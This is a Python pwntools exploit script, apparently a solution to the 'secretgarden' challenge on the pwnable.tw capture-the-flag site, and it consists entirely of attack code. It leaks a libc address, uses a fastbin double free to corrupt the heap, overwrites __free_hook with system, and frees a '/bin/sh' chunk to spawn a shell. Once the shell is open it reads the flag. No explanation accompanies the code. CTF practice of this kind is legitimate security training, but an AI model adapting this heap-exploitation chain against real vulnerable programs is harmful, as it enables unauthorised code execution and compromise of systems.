from pwn import *

local = 0

if local:
	p = process("./secretgarden",env={"LD_PRELOAD" : "./libc_64.so.6"})
else:
	p = remote("chall.pwnable.tw",10203)
libc = ELF("./libc_64.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(length,name):
	p.sendlineafter("Your choice : ",'1')
	p.sendlineafter("Length of the name :", str(length))
	p.sendafter("The name of flower :", name)
	p.sendlineafter("The color of the flower :", "1")
	p.recvuntil("Successful !\n")

def visit():
	p.sendlineafter("Your choice : ",'2')
	p.recvuntil("Name of the flower[3] :")
	addr = u64(p.recv(6).ljust(8,"\x00"))
	return addr


def remove(index):
	p.sendlineafter("Your choice : ",'3')
	p.sendlineafter("Which flower do you want to remove from the garden:", str(index))
	p.recvuntil("Successful\n")


add(0xa0,"11111111")
add(0x60,"22222222")
add(0x60,"33333333")
remove(0)
add(0x70,"\x78")
add(0x40,"44444444")
add(0x40,"55555555")
addr = visit()
print hex(addr)
remove(4)
remove(5)
remove(4)
add(0x40,p64(0x71))
add(0x40,"/bin/sh\x00")
add(0x40,"77777777")

remove(1)
remove(2)
remove(1)
add(0x60,p64(addr - 0x40))
add(0x60,"11111111")
add(0x60,"22222222")
#libc.address = addr - 0x3c4b78
libc.address = addr - 0x3C3B78
add(0x60,"\x00"*0x30 + p64(libc.sym["__free_hook"] - 0xb58))
print "free_hook :" + hex(libc.sym["__free_hook"])

add(0x300,"7")
add(0x300,"7")
add(0x300,"7")
add(0x60,"7")
add(0x100,"\x00"*0xb8 + p64(libc.sym["system"]))
p.sendlineafter("Your choice : ",'3')
p.sendlineafter("Which flower do you want to remove from the garden:", str(7))
p.sendline("cd /home/secretgarden/")
p.sendline("cat flag")
p.interactive()